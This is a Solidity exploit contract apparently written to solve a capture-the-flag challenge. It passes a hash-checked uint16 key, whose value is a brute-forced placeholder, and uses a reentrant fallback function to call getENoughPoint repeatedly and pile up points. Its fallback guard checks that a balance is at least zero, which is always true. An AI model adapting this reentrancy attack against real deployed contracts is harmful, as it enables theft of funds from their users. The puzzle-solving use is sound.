// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface IChallengeTwo {
    function passKey(uint16 _key) external;
    function getENoughPoint(string memory _name) external;
    function addYourName() external;
    function getAllwiners() external view returns (string[] memory _names);
}

contract ExploitContract {
    IChallengeTwo public challenge;
    
    constructor(address challengeAddress) {
        challenge = IChallengeTwo(challengeAddress);
    }
    
    // Part 1: For passKey function
    function exploitPassKey() external {
        // We need to find the uint16 value that matches the hash:
        // keccak256(abi.encode(_key)) == 0xd8a1c3b3a94284f14146eb77d9b0decfe294c3ba72a437151caae86c3c8b2070
        // Since uint16 has a small range (0-65535), we can brute force it offline
        uint16 key = 2524; // Replace with actual value found from brute force
        challenge.passKey(key);
    }
    
    // Part 2: For getEnoughPoint function
    function exploitPoints() external {
        // This is the main vulnerability
        // When msg.sender.call("") is executed, it will trigger the fallback function
        challenge.getENoughPoint("Favour");
    }
    
    // Fallback function to recursively call getENoughPoint
    fallback() external {
        if(address(challenge).balance >= 0) {
            // Re-enter until we get enough points
            try challenge.getENoughPoint("exploit") {} catch {}
        }
    }
    
    // Part 3: Complete the challenge
    function completeChallenge() external {
        challenge.addYourName();
    }
}